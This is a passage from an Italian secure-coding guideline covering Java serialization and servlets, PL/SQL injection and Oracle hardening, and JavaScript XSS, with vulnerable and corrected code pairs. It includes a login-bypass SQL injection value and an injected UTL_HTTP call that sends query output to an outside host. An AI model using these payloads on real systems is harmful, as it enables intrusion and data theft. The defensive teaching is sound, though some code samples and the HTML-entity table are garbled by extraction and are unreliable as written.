private final void readObject(ObjectInputStream in)  throws java.io.IOException { 
   throw new java.io.IOException("L’oggetto non può  essere deserializzato"); 
} 
 
 
Linee guida per lo sviluppo sicuro Pag. 73  a 156  
 
[...] 
 
Utilizzare una libreria esterna come SerialKiller è  molto utile per mettere le classi Java al riparo d alla 
vulnerabilità nota come “unsecure serialization”.  In pratica produce una sottoclasse “sicura “ della classe 
usata da Java per la deserializzazione: ObjectInput Stream. 
Il codice Java, dopo aver importato tale libreria, viene modificato come segue: 
 
Formato vulnerabile: 
ObjectInputStream ois = new ObjectInputStream(is); 
String msg = (String) ois.readObject();  
 
Formato sicuro: 
ObjectInputStream ois = new SerialKiller(is, "/etc/ serialkiller.conf"); 
String msg = (String) ois.readObject(); 
 
7.2.10.10  Memorizzazione delle informazioni riservate 
Non inserire all’interno del codice informazioni ri servate, come chiavi crittografiche, passwords, cer tificati, 
etc. Informazioni personali non devono mai essere i nserite in chiaro né devono essere presenti all’int erno 
del codice o lasciati nella cache. 
7.2.10.11  Packages 
Creazione dei packages  
I packages devono essere concepiti per organizzare in una forma logica le classi dell’applicazione; un  
package deve contenere funzionalità simili e omogen ee. 
 
Protezione dei packages 
È necessario proteggere i package a livello globale , contro l’immissione di codice malevolo o alterato . Di 
seguito vengono riportati due esempi su come rispet tare questa regola: 
Esempio: 
// Inserire la seguente linea nel file java.securit y properties. 
// Ciò causerà un’eccezione nel loader defineClass non appena 
// si proverà a definire una nuova classe all’inter no del pacchetto, 
// a meno che il codice non sia stato dotato del se guente permesso 
// RuntimePermission("defineClassInPackage."+packag e) 
[...] 
package.definition=Pacchetto1 [,Paccchetto2,...,Pac chetton] 
[...] 
 
È anche possibile inserire le classi del pacchetto in un file jar. In questo modo nessun codice può ot tenere il 
permesso ad ampliare il pacchetto e non c’è quindi motivo di modificare il file java.security properti es.  
È necessario proteggere l’accesso. Ciò può essere f atto inserendo la seguente linea nel file java.secu rity 
properties: 
[...]  
package.access=Pacchetto 1 [,Pacchetto 2,...,Pacche tto n] 
[...] 
Ciò causerà un’eccezione nel loader loadClass non a ppena si proverà ad accedere ad una classe 
all’interno del pacchetto, a meno che il codice non  sia stato dotato del seguente permesso: 
[...] 
RuntimePermission("accessClassInPackage."+package) 
[...] 
7.2.10.12  Gestione delle eccezioni 
Tutti i null pointer devono essere gestiti, di modo  che il programma sia robusto e non dia origine a “ stack 
trace” incontrollati . La forma corretta nell’esemp io che segue, mostra come utilizzare le capacità di  logging 
di Java per mantenere traccia delle eccezioni. 
 
 
 
Linee guida per lo sviluppo sicuro Pag. 74  a 156  
 
Esempio : 
Forma non corretta 
import java.io.*; 
import java.util.*; 
public class BadEmptyCatch { 
  List quarks = new ArrayList(); 
  quarks.add("hello word"); 
  FileOutputStream file = null; 
  ObjectOutputStream output = null; 
  try{ 
   file = new  FileOutputStream("quarks.ser"); 
output =new ObjectOutputStream(file); 
   output.writeObject(quarks); 
  } 
  catch(Exception exception){System.err.println(exc eption); 
  } 
  finally{ 
    try { 
    if (output != null) { 
     output.close(); 
    } 
   } 
   catch(Exception exception){ 
    } 
  } 
 
Forma corretta: 
import java.io.*; 
import java.util.*; 
import java.util.logging.*; 
 
public class ExerciseSerializable { 
 
 public static void main(String args) { 
  List quarks = new ArrayList(); 
  quarks.add("hello word"); 
  ObjectOutput output = null; 
  try{ 
   OutputStream file = new FileOutputStream( "quark s.ser"); 
   OutputStream buffer = new BufferedOutputStream( file ); 
output =  
new ObjectOutputStream(buffer);  output.writeObject (quarks); 
  } 
  catch(IOException ex){ 
   fLogger.log(Level.SEVERE, "Cannot perform output .", ex); 
  } 
  finally{ 
   try { 
    if (output != null) { 
     output.close(); 
    } 
   } 
   catch (IOException ex ){ 
    fLogger.log(Level.SEVERE, "Cannot close output stream.", ex); 
   } 
  } 
 
O si specifica la clausola throws e si rinvia quind i la cattura dell’errore alla classe chiamante, opp ure lo si 
gestisce localmente. In questo caso bisogna evitare  di raggruppare le eccezioni in un blocco di eccezi oni 
generico, in quanto ciò rappresenterebbe una perdit a di informazioni importanti.  
 
Esempio: 
Forma non corretta 
import java.io.*; 
 
 
Linee guida per lo sviluppo sicuro Pag. 75  a 156  
 
import java.util.*; 
public class BadGenericThrow { 
 public void makeFile() throws Exception { 
  //create a Serializable List 
  List<String> quarks = new ArrayList<String>(); 
  quarks.add("hello word"); 
  FileOutputStream file = null; 
  ObjectOutputStream output = null; 
  try{ 
   file = new FileOutputStream("quarks.ser"); 
   output = new ObjectOutputStream(file); 
output.writeObject(quarks); 
  } 
  finally{ 
   if (output != null) { 
    output.close(); 
   } 
  } 
 } 
}  
 
Forma corretta 
import java.io.*; 
import java.util.*; 
 
public class BadGenericThrow { 
 public void makeFile() throws  IOException, FileNo tFoundException{ 
  //create a Serializable List 
  List<String> quarks = new     ArrayList<String>() ; 
  quarks.add("hello word"); 
  FileOutputStream file = null; 
  ObjectOutputStream output = null; 
  try{ 
   file = new FileOutputStream("quarks.ser"); 
   output = new ObjectOutputStream(file); 
output.writeObject(quarks); 
  } 
  finally{ 
   if (output != null) { 
    output.close(); 
   } 
  } 
 } 
} 
7.2.10.13  Java Servlet 
I dati dei moduli (form) html dovrebbero viaggiare preferibilmente attraverso richieste di tipo http P OST, 
per cui il metodo doGet dovrebbe solo contenere la gestione dell’errore sollevato se viene invocato il  
metodo GET. La ragione per preferire il metodo POST  sta nel fatto che in questo caso i parametri non 
viaggiano sull’url e non vengono pertanto memorizza ti nei file di log o nella cache del browser. 
Chiaramente POST è ugualmente manipolabile, ma con maggior difficoltà. 
Per implementare in maniera flessibile la sicurezza  delle servlet si può agire attraverso la configura zione 
web.xml, oppure è possibile utilizzarel’annotazione  @ServletSecurity con le annotazioni ausiliarie 
@HttpMethodConstraint e @HttpConstraint. 
 
Nell’esempio seguente la servlet viene resa sicura attraverso la configurazione del file web.xml: 
<?xml version="1.0" encoding="UTF-8"?> 
<web-app xmlns="http://java.sun.com/xml/ns/javaee" [...] version="3.0"> 
  <display-name>Esempio Servlet Sicurezza</display- name> 
 
  <servlet> 
    <servlet-name>servletSicurezza</servlet-name> 
    <servlet-class>com.package.servlet.servletSicur ezza</servlet-class> 
  </servlet> 
 
 
Linee guida per lo sviluppo sicuro Pag. 76  a 156  
 
 
  <servlet-mapping> 
    <servlet-name>servletSicurezza</servlet-name> 
    <url-pattern>/</url-pattern> 
  </servlet-mapping> 
 
  <security-constraint> 
    <web-resource-collection> 
      <web-resource-name>secure</web-resource-name>  
      <url-pattern>/</url-pattern> 
      <http-method>GET</http-method> 
    </web-resource-collection> 
    <auth-constraint> 
      <role-name>dipendente</role-name> 
    </auth-constraint> 
  </security-constraint> 
 
  <login-config> 
    <auth-method>BASIC</auth-method> 
    <realm-name>default</realm-name> 
  </login-config> 
 
</web-app> 
Si impone l’autenticazione base, per il metodo GET.  Solo gli utenti appartenenti al ruolo “dipendente”  
possono accedere. 
La stessa cosa può essere ottenuta attraverso l’ann otazione @ServletSecurity. 
Esempi:  
Il seguente codice impone l’uso della crittografia in tutte le connessioni GET  
@ServletSecurity(@HttpConstraint(transportGuarantee  =                 
TransportGuarantee.CONFIDENTIAL)) 
 
La dichiarazione seguente, invece, nega le connessi oni con il metodo GET. POST invece è ammesso: 
@ServletSecurity( 
    httpMethodConstraints = @HttpMethodConstraint(v alue = "GET", 
                        emptyRoleSemantic = EmptyRo leSemantic.DENY) 
) 
Con la seguente affermazione si permette l’acceso s olo a utentti del ruolo “admin”: 
@ServletSecurity(@HttpConstraint(rolesAllowed = "ad min")) 
 
I valori presenti come parametri nella request devo no essere validati prima di poter essere utilizzati  
dall’applicazione. URL, Cookies, Form Fields, Hidde n Fields, Headers, etc. ottenuti dai metodi 
getParameter(), getCookie(), o getHeader() degli og getti HttpServletReques), prima di essere utilizzat i, 
devono essere rigorosamente validate server-side. 
Ciascun parametro in input deve specificare : 
• il tipo di dato (string, integer, real, etc.); 
• il set di caratteri consentito; 
• la lunghezza minima e massima; 
• la possibilità di accettare il valore NULL; 
• la possibilità che il parametro sia richiesto o men o; 
• la possibilità che siano  permessi i duplicati; 
• intervallo numerico; 
• i valori ammessi (numerazione) ; 
• i pattern (espressioni regolari) ; 
Per ciascun parametro occorre inoltre filtrare qual siasi carattere speciale e sostituirlo con il corri spondente 
carattere HTML. Queste routine di controllo devono essere sempre eseguite all’interno dei metodi doGet () 
e doPost() di tutte le Servlet che compongono la We b Application.  
La tabella seguente mostra un’esemplificazione dei caratteri speciali che devono essere ricercati e le  
corrispondenti sostituzioni HTML che devono essere effettuate.  
 
 
 
Linee guida per lo sviluppo sicuro Pag. 77  a 156  
 
Carattere speciale da 
ricercare:  
 Car attere HTML sostitutivo:  
 
< &lt;  
> &gt;  
( &40;  
) &41;  
# &35;  
& &38;  
Un metodo spesso adottato per effettuare queste ope razioni di filtro e controllo consiste nell’adozion e di 
un Web Application Firewall (WAF). Questi reverse p roxies ricevono il traffico dai client, e dopo oppo rtune 
modifiche, lo passano alla parte di back-end, sul s erver. 
 
Anche per le servlet esiste la possibilità di una S QL injection. Un Web Application Firewall è una dif esa 
contro le injection in generale, ma se una servlet accede ad un database, è opportuno che  i relativi 
statements SQL non siano mai costruiti utilizzando concatenazioni di stringhe soprattutto se tali 
informazioni sono inserite dagli utenti. Invece del la concatenazione dinamica di stringhe, occorre uti lizzare 
l’interfaccia PreparedStatement che, tramite il dri ver JDBC, effettua la canonicalizzazione dei parame tri in 
modo automatico. Di seguito un esempio di utilizzo dell’interfaccia PreparedStatement. 
Esempio: 
. . . 
String selectStatement = "SELECT * FROM User WHERE userId = ? "; 
PreparedStatement prepStmt = con.prepareStatement(s electStatement); 
prepStmt.setString(1, userId); 
ResultSet rs = prepStmt.executeQuery(); 
. . . 
Per quanto riguarda il controllo delle sessioni, bi sogna evitare di creare token di sessione ad-hoc ed  
utilizzare preferibilmente quelli messi a disposizi one del web container (o web application server) in  uso, 
gestendo le sessioni utente tramite l’apposita inte rfaccia javax.servlet.http.HttpSession. In qualsias i caso i 
token di sessione dovrebbero sempre rispettare le s eguenti regole: 
• non devono mai essere inclusi nelle URL; 
• devono essere costituiti da lunghe e complicate cat ene di numeri randomici che non possano 
essere facilmente indovinati; 
• dovrebbero cambiare di frequente durante una sessio ne; 
• dovrebbero cambiare quando si passa ad utilizzare p rotocolli come SSL; 
• non devono mai essere utilizzati token scelti da un  utente. 
Se per memorizzare le sessioni si utilizzano i cook ies, si devono sempre rispettare le seguenti regole  
minime: 
• i cookies non devono essere mai utilizzati per memo rizzare dati personali o informazioni sensibili 
(es: login, password, fede religiosa, malattie, etc .); 
• prima di trasferire informazioni personali o sensib ili verso un utente è necessario richiedere sempre 
la sua autenticazione e autorizzazione tramite inse rimento di login e password: non basarsi mai 
sulla presenza o meno di un cookie precedentemente memorizzato; 
• configurare i session cookies in modo tale che scad ano quando l’utente esce dal browser; 
• assicurarsi che tutte le informazioni contenute nei  cookies siano accuratamente verificate e filtrate 
prima di essere utilizzate e/o inserite nei documen ti HTML. 
Altra norma che agevola la sicurezza consiste nel l imitare la dimensione delle risposte http. Ove poss ible 
limitare sempre la lunghezza delle risposte HTTP al  minimo necessario, troncando quelle che hanno una 
dimensione eccedente. 
C’è anche una buona prassi che riguarda l’HTTP Refe rer. Ove possible, verificare sempre il campo Refer er 
dell’header HTTP (es. metodo getHeader(java.lang.St ring name) dell’interfaccia 
 
 
Linee guida per lo sviluppo sicuro Pag. 78  a 156  
 
javax.servlet.http.HttpServletRequest) e rigettare le informazioni provenienti da host o link incorret ti e/o 
inaspettati. 
Trattamento dei files e degli oggetti embedded. Una  servlet non deve mai accettare in input contenuti 
sottomessi da un utente che contengano tag HTML, ti pici dell’iclusione di file od oggetti come: <EMBED >, 
<OBJECT> e <SCRIPT>. 
 
Come già evidenziato altrove, tutte le eccezioni ch e si verificano durante l’esecuzione delle servlet che 
costituiscono l’applicazione web devono essere catt urate e gestite opportunamente. I relativi mesaggi di 
errore sollevati (es. dump di databse o codici di e rrore - out of memory, null pointer exceptions, sys tem call 
failure, database unavailable, network timeout), de vono essere visualizzati verso l’utenza in accordo ad uno 
schema ben dettagliato: agli utenti generici devono  essere inviate le informazioni minime in grado di 
aiutarli nella comprensione degli errori stessi (se nza rivelare dettagli superflui), mentre le informa zioni sulla 
diagnostica devono essere inviate per la visualizza zione esclusivamente agli amministratori 
dell’applicazione. Il meccanismo di gestione errori  deve essere in grado di gestire ogni tipo di dati in 
ingresso e di garantire la sicurezza. Devono essere  previsti dei messaggi di errore semplici, in grado  di 
indicare la causa. I tentativi d’intrusione devono essere registrati nei file di log, qualunque ne sia  l’esito, in 
modo tale da poterli verificare in un secondo tempo . La gestione degli errori non deve essere concentr ata 
soltanto sui dati forniti in ingresso dall’utente, ma deve includere anche tutti gli errori che posson o essere 
generati da componenti interni come system call, qu ery sul db o altre funzioni interne. 
Anche il risparmio delle risorse macchina una buona  prassi. Ove possibile,implementare meccanismi che 
consentono di limitare al massimo il numero di riso rse allocate per ogni singolo utente. Per gli utent i 
auntenticati, è possibile fissare una quota in modo  da poter limitare il carico massimo che un utente può 
applicare al sistema. Per gli utenti non autenticat i, si dovrebbero evitare tutti gli accessi che comp ortino 
query e la possibilità di utilizzare altre applicaz ioni avide di risorse ritenute superflue, mantenend o ad 
esempio in una cache il contenuto dei dati ricevuti  da questi utenti invece di eseguire delle nuove qu ery sul 
DataBase. 
7.3  PL/SQL 
PL/SQL (Programming Language / Structured Query Lan guage) è un linguaggio di programmazione che 
viene implementato su un Oracle RDBMS. PL/SQL è in grado di utilizzare gli oggetti messi a disposzione  dal 
RDBMS Oracle, poiché è stato realizzato “su misura”  per tali oggetti. 
I maggiori database relazionali di altri produttori  includono linguaggi di programmazione simili a PL/ SQL di 
Oracle, anch’essi in grado di utilizzare le specifi cità degli oggetti a loro disposizione per incremen tare la 
produttività e creare processi elaborativi automati zzati efficienti. Sybase e Microsoft SQL Server uti lizzano 
Transact-SQL, IBM DB2 utilizza SQL procedural Langu age, PostgreSQL supporta PL/pgSQL, ecc.  
7.3.1  Cross-site scripting (XSS) 
Come riconoscerla 
Il Cross Site Scripting consiste nella possibilità di inoculare uno script e di mandarlo in esecuzione  sul front-
end dell’applicazione. Tramite tecniche sviluppate da malintenzionati per ottenere informazioni person ali, 
possono, ad esempio, essere simulate pagine quasi i dentiche ad altri siti molto frequentati per ottene re 
informazioni riservate. La prassi del “social engin eering” consente di ingannare gli utenti per indurl i a 
visitare pagine fraudolente. Gli attacchi XSS di ti po reflected si verificano ogni qualvolta uno scrip t viene 
inoculato ed eseguito nel periodo in cui dura la se ssione. Gli XSS stored, viceversa, sono script male voli che 
sono stati memorizzati su una base dati e vengono p ertanto incorporati nella pagina ( e quindi eseguit i) 
ogni volta che qualcuno ne fa richiesta. 
Siamo di fronte ad DOM based XSS se i dati malevoli , contenenti tag HTML e script, vengono incorporati  
direttamente nell'HTML della pagina, in modo che il  browser visualizzerà queste informazioni come part e 
della pagina web eseguendo in maniera silente gli s cript. Chi visualizza la pagina modificata in modo 
fraudolento non sarà in grado di riconoscere l’inga nno. 
 
 
Linee guida per lo sviluppo sicuro Pag. 79  a 156  
 
Come difendersi 
Per prima cosa è necessatio convalidare tutti gli i nput, indipendentemente dalla fonte: la convalidazi one 
dovrebbe essere basata su una white list (una lista  di valori ammessi), per cui verrebbero accettati s olo i 
dati compresi e rifiutati tutti gli altri. 
Occorre controllare, oltre che i valori siano fra q uelli ammessi o che rientrino in un determinato int ervallo 
di validità, se corrispondano alle attese anche il tipo, la dimensione e il formato dei dati in input.  
Un altro accorgimento consiste nell’encoding (codif ica) di tutti i dati dinamici, cioè nella neutraliz zazione 
dei caratteri pericolosi, in modo da rendere inatti vi eventuali inserimenti malevoli. La codifica dovr ebbe 
essere sensibile al contesto, in base al tipo di da to che si vuole neutralizzare: se ci si aspetta che  possa 
esserci codice HTML abusivo, occorre codificare gli  eventuali tag HTML, se ci si potrebbe trovare di f ronte a 
uno script, allora bisogna codificare gli elementi sintattici di Javascript, ecc. 
Si consiglia di utilizzare la libreria di codifica ESAPI o le funzioni di libreria sistema incorporate . 
Nell'intestazione di risposta Content-Type HTTP, de finire esplicitamente la codifica dei caratteri (ch arset) 
per l'intera pagina 
Impostare la flag httpOnly sul cookie della session e, per impedire che eventuali attacchi XSS possano 
manometterlo. 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/79.html  
CWE-79: Improper Neutralization of Input During Web  Page Generation ('Cross-site Scripting') 
 
7.3.2  Resource Injection 
Come riconoscerla  
L'applicazione apre un socket di rete, per l'ascolt o delle connessioni in entrata, utilizzando dati no n 
attendibili. In questo modo si consente a un utente  malintenzionato di controllarlo. 
L’attaccante potrebbe perciò essere in grado di apr ire una backdoor che gli consenta di connettersi 
direttamente al server delle applicazioni, acquisen do il controllo del server o esponendolo ad altri a ttacchi 
indiretti. In particolare, modificando il numero di  porta del socket, potrebbe essere in grado di aggi rare 
controlli di rete deboli, mascherando l'attacco da parte di altri dispositivi di rete. 
Una resource injection può essere sfruttata anche p er bypassare i firewall o altri meccanismi di contr ollo 
degli accessi. Si può anche utilizzare l'applicazio ne come proxy per la scansione delle porte delle re ti interne 
e per l'accesso diretto ai sistemi locali; oppure p er indurre un utente a inviare informazioni riserva te a un 
server fraudolento. 
Come difendersi 
Non consentire a un utente di definire i parametri relativi ai sockets di rete. 
Questo esempio in PLSQL prende un path di tipo URL da una CGI ed esegue il download del file contenuto . 
La vulnerabilità è rappresentata dalla possibilità per un utente malintenzionato di modificare il path  o il 
nome del file, ricevendo dal server del contenuto a rbitrario e potenzialmente dannoso. 
Esempio: 
filename := SUBSTR(OWA_UTIL.get_cgi_env('PATH_INFÒ) , 2); 
WPG_DOCLOAD.download_file(filename); 
 
Per ulteriori informazioni si veda:  http://cwe.mitre.org/data/definitions/99.html, 
CWE-99: Improper Control of Resource Identifiers (' Resource Injection'). 
7.3.3  SQL Injection 
Come riconoscerla  
 
 
Linee guida per lo sviluppo sicuro Pag. 80  a 156  
 
SQL Injection è una tecnica che consente a un attac cante di inserire comandi SQL arbitrari nelle query  
eseguite da un'applicazione Web sul proprio databas e. Può funzionare su pagine Web e app vulnerabili c he 
utilizzano un database relazionale. 
Un attacco riuscito può comportare l'accesso non au torizzato a informazioni riservate nel database o l a 
modifica di dati. In alcuni casi, una SQL Injection  riuscita può arrestare o addirittura eliminare l'i ntero 
database. 
Come difendersi 
Come prima misura, occorre validare l’input, sottop onendolo a rigidi controlli, come già illustrato ne i punti 
precedenti. 
Le query SQL non devono mai essere realizzate conca tenando stringhe con l’input esterno. Bisogna invec e 
utilizzare componenti di database sicuri come le st ored procedure (stored procedures), query 
parametrizzate alle quali si associano i valori in input. 
Una soluzione che può essere d’aiuto consiste nell’ utilizzazione di una libreria ORM, come 
EntityFramework, Hibernate o iBatis. 
Occorre limitare l'accesso agli oggetti e alle funz ionalità del database, in base al "Principle of Lea st 
Privilege" (non fornire agli utenti permessi superi ori a quelli strettamente necessari).  
Esempio: 
Consideriamo la seguente query: 
SELECT * FROM Tabella WHERE username='$user' AND pa ssword='$pass' 
$user e $pass sono impostate dall'utente e supponia mo che nessun controllo su di esse venga fatto. 
Vediamo cosa succede inserendo i seguenti valori: 
$user = ' or '1' = '1 
$pass = ' or '1' = '1 
La query risultante sarà: 
SELECT * FROM Tabella WHERE username='' or '1' = '1 ' AND password='' or '1' = '1' 
 
Nell'approccio white list viene proposto un insieme  di caratteri validi. Ad ogni richiesta, se l'input  ricevuto 
contiene dei caratteri non presenti in tale lista, allora segnaleremo un errore. Ciò comporta un’atten ta 
definizione della lista in fase di definizione dei requisiti dell'applicazione, oltre che una corretta  gestione dei 
caratteri. 
Oltre la white list, si può anche usare il metodo d ella concatenazione delle variabili con uso della 
funzionalità “quote”. 
 
Esempio: 
Forma non corretta: 
SQLExec("SELECT NAME, PHONE FROM PS_INFO WHERE NAME ='" | &UserInput | "'", &Name, 
&Phone); 
 
Forma corretta 
SQLExec("SELECT NAME, PHONE FROM PS_INFO WHERE NAME ='" |  
Quote(&UserInput) | "'", &Name, &Phone); 
 
Per ulteriori informazioni si veda:  http://cwe.mitre.org/data/definitions/89.html  CWE-89, 
Improper Neutralization of Special Elements used in  an SQL Command ('SQL Injection') 
7.3.4  Ulteriori indicazioni per lo sviluppo sicuro 
Di seguito vengono descritte ulteriori direttive pe r lo sviluppo PL/SQL in sicurezza. 
7.3.4.1  Posizionamento delle procedure PL/SQL 
È  necessario valutare attentamente la posizione in  cui si collocano le procedure sviluppate: 
• In file separati, organizzati per categoria, sul fi lesystem del db server: 
• Minor numero di vulnerabilità derivanti dal fatto c he il codice non viene precaricato 
• Implementazione di meccaniche di “failover” più sem plice 
 
 
Linee guida per lo sviluppo sicuro Pag. 81  a 156  
 
• Possibilità dell’uso del version-control e backup 
• Maggiore protezione del codice sorgente, difficile da sovrascrivere 
• Nei packages del DB: 
• Maggior efficenza del codice 
• Accesso al codice tramite la tabella USER_SOURCE 
• Integrazione con alcuni IDE 
7.3.4.2  Tipologie di procedure vulnerabili 
L’utilizzo di differenti strumenti di manipolazione  dei dati che il PL/SQL mette a disposizione degli 
sviluppatori, determina la modalità con cui il codi ce viene scritto, ed in ultima istanza determina la  tipologia 
di risorsa che il codice andrà a comporre. Esistono  in PL/SQL i seguenti tipi di “risorse”: 
• embedded SQL 
• cursori (ovvero i recordset del PL/SQL) 
• EXECUTE IMMEDIATE (ovvero PL/SQL dinamico) 
• Packages 
• Triggers 
Per tutte queste differenti tipologie di risorse, c omunque, la casistica in cui il PL/SQL risulta vuln erabile può 
essere ridotta a due tipologie di codice: 
• Blocco di PL/SQL anonimo, ovvero un blocco di codic e racchiuso da BEGIN ed END, utilizzato per 
eseguire query multiple.  
Esempio: 
EXECUTE IMMEDIATE  
‘BEGIN INSERT INTO TABELLA (COLONNA1) VALUES (‘’’ | | PARAM || ‘’’);  
END;’; 
• Blocco di PL/SQLa singola riga, ovvero quel codice che non è dichiarato con BEGIN ed END, e non 
permette l’utilizzo del carattere “;” per l’iniezio ne di query multiple. 
Esempio: 
OPEN cur_cust FOR ‘select name from customers where  id = ‘’’|| p_idtofind || 
‘’’’; 
7.3.4.3  Filtraggio dei tipi di input iniettabile 
Quando si utilizzano le stored procedures, è necess ario porre opportuna attenzione al filtro dei segue nti tipi 
di input: 
• UNIONI: possono essere utilizzate per includere que ry ulteriori rispetto a quelle effettuate dalla 
stored procedure. 
• SUBSELECTS 
• Comandi DDL/DML (INSERT, UPDATE, DELETE etc.) 
• Nomi dei packages 
7.3.4.4  Filtro dei caratteri potenzialmente dannosi 
• È necessario che i caratteri “ (ASCII 34), ‘ (ASCII  39), in tutte le loro possibili codifiche (hex, as cii, utf-
8, etc.), siano filtrati e/o opportunamente sanitiz zati mediante escaping. 
• È inoltre necessario che i caratteri # (ASCII 35), -- (ASCII 4545), % (ASCII 37), ; (ASCII 59), in tut te le 
loro possibili codifiche (hex, ascii, utf-8, etc.) siano filtrati e/o opportunamente sanitizzati media nte 
escaping. 
7.3.4.5  Direttive per Oracle 
Si elencano di seguito le direttive di configurazio ne del database Oracle alle quali è necessario atte nersi – 
nei limiti posti dalle esigenze applicative – per r aggiungere un elevato livello di sicurezza delle ap plicazioni 
sviluppate con questa tecnologia. Si tratta di azio ni che devono essere eseguite per garantire una cer ta 
sicurezza. 
Account : 
 
 
Linee guida per lo sviluppo sicuro Pag. 82  a 156  
 
• cambiare la password all’utente SYS; 
• disabilitare gli account di default del database; 
Ruoli :  
• revocare il ruolo RESOURCE dagli utenti; 
• revocare il ruolo CONNECT da tutti gli utenti; 
Permessi :  
• revocare il permesso pubblico di esecuzione su utl_ file (vedi par. “prevenire l’upload remoto di 
file”) ; 
• revocare il permesso pubblico di esecuzione su utl_ http (vedi par. “prevenire la redirezione 
dell’output”) ; 
• revocare il permesso pubblico di esecuzione su utl_ tcp ; 
• revocare il permesso pubblico di esecuzione su utl_ smtp ;  
• controllare il permesso pubblico di esecuzione sui packages e le viste di cui gli utenti sys e dba son o 
proprietari; 
• revocare il permesso pubblico su dbms_random; 
• revocare il permesso pubblico su dbms_lob ; 
• revocare ogni tipo di permesso su dbms_sql e dbms_s ys_sql granted; 
• utilizzare i permessi dell'utente chiamante per ogn i tipo di procedura; 
• controllare e opportunamente dispensare il permesso  "BECOME USER"; 
• controllare e opportunamente dispensare il permesso  "CREATE ANY DIRECTORY"; 
• controllare e opportunamente dispensare il permesso  "CREATE JOB"; 
• controllare e opportunamente dispensare il permesso  “CREATE LIBRARY” ; 
• revocare ogni permesso di esecuzione su sys.initjvm aux; 
• revocare il permesso pubblico di esecuzione su dbms _job; 
• revocare il permesso pubblico di esecuzione su dbms _scheduler ; 
• revocare il permesso pubblico di esecuzione su owa_ util; 
• negare l'accesso all'esecuzione di "SELECT ANY TABL E"; 
• controllare ed opportunamente disporre i permessi d i accesso al package dbms_backup_restore; 
• revocare il permesso di creazione degli oggetti a t utti gli utenti eccetto quelli proprietari dello 
schema; 
• controllare l'accesso agli oggetti ed assicurarsi c he gli utenti possano interagire unicamente con gli  
oggetti che sono loro necessari; 
• impedire al dba di leggere le tabelle di sistema; 
• impedire al dba di leggere i dati dell'applicazione . 
Inoltre: 
• controllare ed opportunamente sanitizzare il parame tro utl_file_dir;  
• controllare l'accesso di Java al sistema operativo;   
• controllare e regolare opportunamente la maniera in  cui Java e Oracle interagiscono; 
• rendere extproc sicuro; 
• settare il parametro _trace_files_public a FALSE ; 
• controllare e rendere sicuro il package statspack. 
 
Altre misure per proteggere il codice PL/SQL consis tono nei seguenti punti: 
• Offuscamento del codice con WRAP: l’utility “wrap” (utilizzabile nella forma: wrap iname=input_file 
[oname=output_file]), deve essere utilizzato per of fuscare i files SQL ove le procedure sono 
memorizzate. È necessario ricordare che l’utility w rap è in grado di offuscare il codice rendendo di 
difficile lettura il sorgente (e quindi l’algoritmo ), ma non è in grado di proteggere eventuali string he 
di testo memorizzate staticamente nel codice, come nomi di tabelle e passwords. 
• Prevenire la redirezione dell’output; è sempre nece ssario filtrare l’accesso al package UTL_HTTP 
che può essere utilizzato per la redirezione dell’o utput nelle query.  
 
 
Linee guida per lo sviluppo sicuro Pag. 83  a 156  
 
Esempio:  
Forma non corretta: 
SELECT TRANSLATE(‘input utentè, ‘0123456789ABCDEFGH IJKLMNOPQRSTUVWXYZ’, 
‘0123456789’)  
FROM DUAL;  
Valorizzando l’input utente come: 
 ‘’ || UTL_HTTP.REQUEST(‘http://10.0.0.1/ricevi.php’ ) || ‘’ 
La procedura diventa: 
SELECT TRANSLATE(‘’ || UTL_HTTP.REQUEST(‘http://10. 0.0.1/ricevi.php’) || ‘’, 
‘0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ’,  ‘012345678 9’)  
FROM DUAL; 
• Prevenire l'upload remoto di file. È sempre necessa rio filtrare l'accesso al package UTL_FILE che 
può essere il trasferimento di file tramite stored procedures. 
• Prevenire l'injection di chiamata a funzioni. È sem pre necessario limitare opportunamente il 
contesto di transazione di una procedura. È inoltre  necessario evitare di utilizzare la direttiva 
PRAGMA AUTONOMOUS_TRANSACTION ove non necessario, o nde evitare di modificare il contesto 
transazionale all'interno del quale la query viene eseguita. 
• Dichiarazione dei privilegi di esecuzione delle pro cedure. È necessario: 
• dichiarare le procedure utilizzando la keyword AUTH ID CURRENT_USER;  
• revocare il privilegio EXECUTE sui pacchetti e sull e procedure standard di Oracle non utilizzati; 
• garantire i permessi alle operazioni di creazione ( CREATE) e modifica (ALTER) di procedure 
unicamente ad utenze "trusted"; 
• definire i permessi delle funzioni associandoli uni camente ad utenti "trusted"; 
• garantire il ruolo RESOURCE unicamente ad utenti "t rusted”. 
 
7.4  Javascript 
 
JavaScript è un linguaggio di programmazione interp retato, con tipizzazione debole e dinamica. Insieme  con 
HTML e CSS, costituisce la tecnologia di base per r ealizzare pagine web. Negli ultimi anni Javascript ha 
assunto un’importanza molto accentuata, grazie alla  diffusione di innumerevoli framework che ne 
estendono e semplificano l’uso. Nuove versioni hann o fatto di Javascript un linguaggio moderno, flessi bile e 
potente. Nato come linguaggio lato client, interpre tato esclusivamente dal browser, Javascript è oggi anche 
diffuso come componente server-side supportato da R DBMS e web server. 
7.4.1  Cross Site Scripting (XSS) 
Come riconoscerla 
Il problema principale veicolato da Javascript è il  Cross Site Scripting (XSS), che si attua inoculand o, 
attraverso un canale di input non controllato né ve rificato, uno script malevolo. 
Il canale attraverso il quale l’input fraudolento p uò entrare può essere il campo di un modulo o un 
parametro passato attraverso l’url di una request G ET, o nel corpo di una request POST. 
Uno script malevolo può inviare all’esterno infroma zioni sulla sessione, leggere i cookie, dati person ali e 
altre informazioni riservate; può anche modificare la pagina attraverso la manipolazione del DOM (Doma in 
Object Model) dell’HTML. Da questo punto in poi, l’ utente può essere tratto in inganno in molti modi: 
potrebbe essere indotto a inserire dati personali i n una finta verifica o può essere dirottato su pagi ne fake 
che ne carpiscano la fiducia. 
Il Cross Site Scripting può essere reflected o stor ed. Nel primo caso, uno script inoculato è valido s olo 
all’interno della sessione corrente, ma i suoi effe tti possono essere molto dannosi per il sito vittim a 
dell’attacco. 
Ancora più grave è il Cross Site Scripting di tipo stored. In questo caso lo script inoculato viene me morizzato 
come parte intregrante della pagina all’interno di un database e rispristinato ogni qual volta la pagi na in 
 
 
Linee guida per lo sviluppo sicuro Pag. 84  a 156  
 
questione viene caricata. Quest’attacco è stato sfr uttato ampiamente nel recente passato, soprattutto 
laddove veniva consentito agli utenti di inserire r ecensioni, commenti e altri contributi. 
Volendo schematizzare, possiamo categorizzare gli a ttacchi XSS nelle seguenti tipologie: 
• Reflected XSS, in cui la stringa dannosa proviene d alla richiesta dell’utente. 
